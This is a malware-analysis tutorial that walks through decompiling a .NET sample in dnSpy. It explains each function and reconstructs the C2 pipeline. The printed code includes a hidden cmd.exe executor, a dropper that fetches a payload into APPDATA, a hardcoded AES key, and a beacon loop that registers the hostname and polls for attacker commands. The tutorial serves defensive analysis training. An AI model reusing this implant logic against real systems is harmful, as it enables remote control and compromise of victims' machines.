
dnSpy is an open-source .NET assembly (C#) debugger and editor. It is typically used for reverse engineering .NET applications and analysing their code and is primarily designed for examining and 
modifying .NET assemblies in a user-friendly, interactive way. It's also capable of modifying the retrieved source code (editing), setting breakpoints, or running through the code one step at a time (debugging).


# Decompiling Malware Samples With dnSpy
Once the tool is open, we will load the malware sample by navigating to File > Open located on the upper-left side of the application.
When you get the prompt, click the following to navigate to the malware's location: This PC > Desktop > artefacts. Now that you are inside the malware sample folder, you first need to change the file type to "All Files" to see the defanged version of the binary. Next, double-click the malware sample to load it into the application.
Once the malware sample is loaded, you'll have a view like the image below. The next step is to click the Main string, which will take you to the entry point of the application.
As discussed in the previous section, the Main function in a class is the program's entry point. This means that once the application is executed, the lines of code inside that function will be run one step at a time until the end of the code block.


# Understanding the Malware Functionalities
You might have been a little overwhelmed when you saw the Main function, but don't worry; we'll discuss the other functions before building the malware execution pipeline.
Focusing on the individual functions before dealing with the Main function can be considered a modular approach. Doing this allows us to easily break down the malware's functionalities without getting bogged down with long code snippets. Moreover, it allows us to recognise some potential execution patterns that ease our overall understanding of the malware.
You can click on the items to compare the code in dnSpy. It's also advisable to read the .NET Framework documentation to learn more about the internal functions mentioned in the following sections.


# GetIt
Based on the source code, the GetIt function uses the WebRequest class from the System.Net namespace and is initialised by the function's URL argument. The name is already a giveaway that the WebRequest is being used to initiate an HTTP request to a remote URL.

// Accepts one argument, which is the URL
public static string GetIt(string url)
{
    // 1. Initialise the HttpWebRequest Class with the target URL (from the argument of the function).
    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
    // 2. Set the user-agent of the HTTP request.
    httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15";
    // 3. Return the response of the HTTP request.
    return new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream()).ReadToEnd();
}

Note: You can render the namespace details by hovering over the WebRequest string, similar to what you see in the image above.
By default, the HTTP method set to the WebRequest class is GET. This means we can assume that the HTTP request made by this function is a GET request.
The three lines of code inside the function can be expanded by the comments written for every line.
In other words, the `GetIt` function accepts a URL as its argument, configures the parameters needed for the HTTP GET request (custom User-Agent), and returns the value of the response.


# PostIt
Like the **GetIt** function, the PostIt function also uses the `WebRequest` class. However, you might observe that it has configured more properties than the first one. The most notable is the Method property, wherein the value is set to POST. This means that the HTTP request made by this function is a POST request, and it submits the second argument as its POST data.

// JuicyTomatoy.Program
// Token: 0x06000008 RID: 8 RVA: 0x000024B4 File Offset: 0x000006B4

// Accepts two arguments: the URL and the data to be sent
public static string PostIt(string url, string data)
{
    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
    // 1. Converts the data argument into bytes.
    byte[] bytes = Encoding.ASCII.GetBytes(data);
    // 2. Sets the HTTP method into POST
    httpWebRequest.Method = "POST";
    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
    httpWebRequest.ContentLength = (long)bytes.Length;
    httpWebRequest.UserAgent = "REDACTED";

    // 3. Prepares the data to be sent.
    using (Stream requestStream = httpWebRequest.GetRequestStream())
    {
    	requestStream.Write(bytes, 0, bytes.Length);
    }
    //4. Returns the response of the HTTP POST request
    return new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream()).ReadToEnd();
}

In simple terms, the `PostIt` function accepts an additional argument as its POST data, which is then submitted to the target URL and returns the response it received.


# Sleeper
The Sleeper function only contains a single line: a call to the `Thread.Sleep` function. The `Thread.Sleep` function accepts an integer as its argument and makes the program pause (for milliseconds) based on the value passed to it.

// JuicyTomatoy.Program
// Token: 0x06000003 RID: 3 RVA: 0x000021FD File Offset: 0x000003FD

// Accepts one argument: an integer to set the sleep timer
public static void Sleeper(int count)
{
    // Sets the program's sleep or pause in milliseconds
    Thread.Sleep(count);
}

The usage of the `Thread.Sleep` function is typical behaviour malware uses to pause its execution to evade detection.


# ExecuteCommand
Given the namespace and class name (`System.Diagnostics.Process`) of the initialised Process class (first code line), it seems this function is being used to spawn a process, according to its [Microsoft documentation](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=netframework-4.7.2). From the initialisation of the `ProcessStartInfo` properties, we can also see that the file to be executed is `cmd.exe` and that the ExecuteCommand's argument (`command` variable) is being passed as a process argument.

// JuicyTomatoy.Program
// Token: 0x06000006 RID: 6 RVA: 0x00002410 File Offset: 0x00000610

// Accepts one argument: the OS command to be executed via cmd.exe
public static string ExecuteCommand(string command)
{
    // 1. Initialises the Process class and its properties.
    Process process = new Process();
    process.StartInfo = new ProcessStartInfo
    {
    	WindowStyle = ProcessWindowStyle.Hidden,
    	FileName = "cmd.exe",
        // 2. Prepares the command to be executed via cmd.exe based on the argument
    	Arguments = "/C " + command
    };
    process.StartInfo.UseShellExecute = false;
    process.StartInfo.RedirectStandardOutput = true;
    
    // 3. Starts the process to trigger the OS command
    process.Start();
    process.WaitForExit();
    
    // 4. Returns the output of the command execution.
    return process.StandardOutput.ReadToEnd();
}

Another thing to note is that the `WindowStyle` property is set to `Process.WindowStyle.Hidden`. This means that the process will run without a window. As such, it's a way to hide the malware's malicious command execution.
This function serves as the malware's OS command execution function.


# Encryptor
The giveaways in this function are the AES classes used in the middle of the code block. If you hover on the initialisation of the `AesManaged aesManaged` variable, it also shows the namespace `System.Security.Cryptography`, which somehow means that everything here is related to cryptography or encryption ([Microsoft documentation](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography?view=netframework-4.7.2)).
Moreover, the `Encryptor` function accepts an argument and encrypts it using the hardcoded KEY and IV values. And lastly, it encodes the encrypted bytes into Base64 using the  `Convert.ToBase64String function`.
In summary, the function encrypts a plaintext string using an AES cipher (together with the key and IV values) and returns the encoded Base64 value of the encrypted version of the string.


# Decryptor
This function is the opposite of the `Encryptor` function, which expects a Base64 string, decodes it, and proceeds to the decryption to retrieve the plaintext string.

private static string Decryptor(string encoded)
{
	byte[] buffer = Convert.FromBase64String(encoded);
	byte[] bytes = Encoding.UTF8.GetBytes("youcanthackthissupersecurec2keys");
	byte[] rgbIV = new byte[]
	{
		9,
		178,
		251,
		121,
		16,
		203,
		49,
		218,
		17,
		5,
		243,
		70,
		230,
		214,
		12,
		216
	};
	string result = null;
	using (AesManaged aesManaged = new AesManaged())
	{
		aesManaged.Mode = CipherMode.CBC;
		aesManaged.Padding = PaddingMode.Zeros;
		aesManaged.BlockSize = 128;
		aesManaged.KeySize = 256;
		ICryptoTransform transform = aesManaged.CreateDecryptor(bytes, rgbIV);
		using (MemoryStream memoryStream = new MemoryStream(buffer))
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
			{
				using (StreamReader streamReader = new StreamReader(cryptoStream))
				{
					result = streamReader.ReadToEnd().Trim(new char[1]);
				}
			}
		}
	}
	return result;
}


# Implant
The last function is the `Implant` function. It accepts a URL string as its argument, initiates an HTTP request to the URL argument, and decodes it with Base64. It also retrieves the **APPDATA** path and attempts to write the contents of the Base64 decoded data into a file. Lastly, if the implanted file was written successfully, it returns its location. If not, it returns an empty string.

// JuicyTomatoy.Program
// Token: 0x06000002 RID: 2 RVA: 0x000021BC File Offset: 0x000003BC

// Accepts one string: the URL of the new payload to be implanted
public static string Implant(string url)
{
    // 1. Uses the GetIt function and the URL argument. Then, decodes its output using Base64.
    byte[] bytes = Convert.FromBase64String(Program.GetIt(url));

    // 2. Retrieves the location of the APPDATA path and appends the file name of the downloaded malware.
    string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\REDACTED.exe";

    // 3. Writes the downloaded data into the APPDATA\\REDACTED.exe and returns the location of the malware if it was successfully written or returns an empty string if it failed.
    File.WriteAllBytes(text, bytes);
    if (File.Exists(text))
    {
    	return text;
    }
    return "";
}

In the context of malware functions, the `Implant` function is a dropper function. This means it downloads and stores other malware inside the compromised machine.


# Building the Malware Execution Pipeline

- Code executed before the for loop -

// 1. Retrieves the victim machine's hostname via Dns.GetHostName function and stores it to a variable.
string hostName = Dns.GetHostName();

// 2. Initialisation of HTTP URL together with the data to be submitted to the /reg endpoint.
string str = "http://REDACTED C2 DOMAIN";
string url = str + "/reg";
string data = "name=" + hostName;

// 3. Execution of the HTTP POST request to the target URL (str variable) together with the POST data that contains the hostname of the victim machine (data variable).
// It is also notable that the response from the HTTP request is being stored in another variable (str2)
string str2 = Program.PostIt(url, data);

// 4. Initialisation of other variables, which will be used in the following code lines.
int count = 15000;
bool flag = false;


- Code inside the for loop before the code block of the if statement -

In this section, you'll see that the for loop is written without any initialised values on the initialisation, condition, and increment sections (`for (;;)` ). This means the loop will run indefinitely until a `break` statement is used.
Afterwards, the first line inside the loop block uses the `Sleeper` function, wherein the `count` variable is being passed. Remember that this variable was already initialised before the for-loop statement.
The following code lines are variable initialisation, wherein the `str & str2` variables are used (e.g. if the value of str is http://evil.com and the value of str2 is TEST, the resulting value for the url2 variable is http://evil.com/tasks/TEST).
Eventually, the `url2` variable is used by the `GetIt` function to do a GET request to the passed URL and the result is stored in the `it` variable.
Lastly, the execution flow will enter the `if` statement only if the `it` variable is not empty.

// 1. This for loop syntax signifies a continuous loop since it has no values set to initialisation, condition, and iteration.
for (;;)
{
    // 2. The Sleeper function is being used together with the count variable, which was initialised prior to the for loop block.
    Program.Sleeper(count);
    
    // 3. Initialisation of other variables, together with the str variable, which contains
    string url2 = str + "/tasks/" + str2;
    string url3 = str + "/results/" + str2;

    // 4. HTTP GET request to url2 variable. The url2 variable equates to domain + "/tasks/" + response to the first POST request made (str variable holds the base URL used by the malware, while str2 holds the response to the first POST request).
    string it = Program.GetIt(url2);
    
    // 5. Conditional statement depending on the HTTP response stored in the it variable. The code will enter in this statement only if the it variable is NOT empty.
    if (!string.IsNullOrEmpty(it))
// redacted section - code block inside the IF statement

In summary, this section is focused on the preparation of variables to execute the HTTP GET request to the `/tasks/` endpoint and enters the `if` statement code block once the condition is satisfied.


- Code executed within the first if statement -

Continuing the execution flow, this code block will only be reached if the GET request on the `/tasks/` endpoint contains a value.
The section before the `if (!(a == "sleep"))` statement is focused on initialising the variables `a` and `text`. It starts by decrypting the string stored in the `it` variable and splits it with a space character (`Decryptor(it).Split(' ')`). The `a` variable's value is the first element of the resulting array, and the `text` variable combines all elements in the same array excluding the first element. The example below shows how the `it` variable is being processed:

// Step 1: Split the decrypted string with space
array = Decryptor(it).Split(' ')
// "shell net localgroup administrators".Split(' ') --> ["shell", "net", "localgroup", "administrators"]

// Step 2: Store the first element into the "a" variable
a = array[0] // a = "shell"
text = ""

// Step 3: Combine the remaining elements (excluding the first) using space
IF array.length > 1
THEN text = combine with space(["net", "localgroup", "administrators"]) // text = "net localgroup administrators"


- Nested conditional statements -

The next section focuses on the condition statements based on the `a` variable's value. You might see that the conditions in the `if` statements are all set to **NOT** ("!")**.** This means that if the condition is satisfied (e.g. variable `a` is not equal to "sleep"), it will go inside the code block to assess it with another condition (e.g. check if variable `a` is not equal to "shell"). Otherwise, it will jump to its counterpart `else` statement. We can simplify this code with a pseudocode like this:

IF a == "sleep"
THEN execute sleep code block

ELSE IF a == "shell"
THEN execute shell code block

ELSE IF a == "implant"
THEN execute implant code block

ELSE IF a == "quit"
THEN execute quit code block

Remember that the `a` variable's value is based on the response received after making an HTTP request to the `/tasks/` endpoint. This means every condition in this code block is based on the instructions pulled from that endpoint. Hence, it can be said that the `/tasks/` URL is the endpoint used by the malware to pull C2 commands issued by the attacker.
Moreover, all the implant and shell command responses are submitted as POST requests to the `url3` variable. Remember, this variable handles the `/results/` endpoint. All command execution and implant outputs are reported to the C2 using the `/results/` endpoint.


- Breaking the loop -

Lastly, the final conditional statement at the end checks if the `flag` variable is set to true. If that statement is satisfied, it will execute a `break` statement.

// 1. Terminates if the flag variable is set to true (via the quit command).
if (flag)
{
    break;
}

This means that the `if` statement that contains the quit condition makes the indefinite for loop stop, terminating the malware execution flow.



































